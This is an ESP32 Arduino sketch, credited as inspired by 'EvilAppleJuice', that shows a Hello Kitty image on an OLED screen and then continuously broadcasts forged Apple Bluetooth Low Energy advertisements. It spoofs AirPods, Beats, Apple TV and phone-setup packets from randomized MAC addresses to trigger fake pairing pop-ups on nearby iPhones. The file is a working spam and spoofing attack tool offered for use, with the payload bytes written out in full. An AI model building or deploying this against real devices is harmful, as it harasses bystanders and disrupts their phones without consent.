// This example takes heavy inpsiration from EvilAppleJuice by ckcr4lyf
// Tested on Wemos Lolin32 ESP32 with built-in SSD1306 OLED

#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

BLEAdvertising *pAdvertising;  // global variable

//customization
uint32_t delaySeconds = 1;
uint32_t advertisementCounter = 0;

#define OLED_RESET  4

Adafruit_SSD1306 display(128, 64, &Wire, OLED_RESET);

//GO KITTY GO!
const unsigned char hellokitty [] PROGMEM = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
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    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};


void setup() {
  // Start I2C Communication SDA = 5 and SCL = 4 on Wemos Lolin32 ESP32 with built-in SSD1306 OLED
  Wire.begin(5, 4);

  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C, false, false)) {
    Serial.println(F("SSD1306 allocation failed"));
    for(;;);
  }

  display.clearDisplay();
  // Draw kittyy!! on the screen
  display.drawBitmap(0, 0, hellokitty, 128, 64, 1);
  display.display();
  delay(delaySeconds * 2000);

  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  pinMode(12, OUTPUT);
  pinMode(13, OUTPUT);

  // Device name
  BLEDevice::init("Follow Wrexik");

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void loop() {
  // Turn lights on during "busy" part
  digitalWrite(12, HIGH);
  digitalWrite(13, HIGH);

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Airpods, Beats, etc.
  const uint8_t DEVICES_LONG[][31] = {
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
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    {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    };
  
  //Apple TV, HomePod, etc.
  const uint8_t DEVICES_SHORT[][23] = {
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
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    {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
};
  
  // Randomly pick data from one of the devices
  // First decide short or long
  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)

  int ranNum = random(2);

  if (ranNum == 0) {
    Serial.println(" ");
    Serial.println("Selected long device");

    int index = random(17);
    oAdvertisementData.addData(std::string((char*)DEVICES_LONG[index], 31));

    int adv_type_choice = random(3);
    if (adv_type_choice == 0){
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1){
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    // Set the device address, advertisement data
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    // Device names corresponding to device numbers
    const char *deviceNameLong[] = {
        "Airpods",
        "AirpodsPro",
        "AirpodsMax",
        "AirpodsGen2",
        "AirpodsGen3",
        "AirpodsProGen2",
        "PowerBeats",
        "PowerBeatsPro",
        "BeatsSoloPro",
        "BeatsStudioBuds",
        "BeatsFlex",
        "BeatsX",
        "BeatsSolo3",
        "BeatsStudio3",
        "BeatsStudioPro",
        "BeatsFitPro",
        "BStudioBudsPlus"};

    Serial.print("Current Device: ");
    Serial.println(deviceNameLong[index]);

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println("Advertised Device:");
    display.setTextSize(2);
    display.setCursor(0, 16);
    display.println(deviceNameLong[index]);
    display.setCursor(0, 48);
    display.setTextSize(1);
    display.println(" ");
    display.print("LONG | ");
    display.print(advertisementCounter);
    display.display();

    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);

    Serial.println("Sending Advertisement...");
    pAdvertising->start();
    advertisementCounter++;
    delay(delaySeconds * 1000); // delay for delaySeconds seconds
    pAdvertising->stop();
  };

  if (ranNum == 1) {
    Serial.println(" ");
    Serial.println("Selected short device");

    int index = random(12);
    oAdvertisementData.addData(std::string((char*)DEVICES_SHORT[index], 23));

    int adv_type_choice = random(3);
    if (adv_type_choice == 0){
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1){
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    // Set the device address, advertisement data
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    // Device names corresponding to device numbers
    const char *deviceNameShort[] = {
        "AppleTVSetup",
        "AppleTVPair",
        "AppleTVNewUser",
        "AppleTVAppleID",
        "AppleTVAudio",
        "AppleTVHomekit",
        "AppleTVKeyboard",
        "AppleTVNetwork",
        "HomepodSetup",
        "SetupNewPhone",
        "TransferNumber",
        "TVColorBalance"};

    Serial.print("Current Device: ");
    Serial.println(deviceNameShort[index]);

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println("Advertised Device:");
    display.setTextSize(2);
    display.setCursor(0, 16);
    display.println(deviceNameShort[index]);
    display.setCursor(0, 48);
    display.setTextSize(1);
    display.println(" ");
    display.print("SHORT | ");
    display.print(advertisementCounter);
    display.display();

    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);

    Serial.println("Sending Advertisement...");
    pAdvertising->start();
    advertisementCounter++;
    delay(delaySeconds * 1000); // delay for delaySeconds seconds
    pAdvertising->stop();
  };
};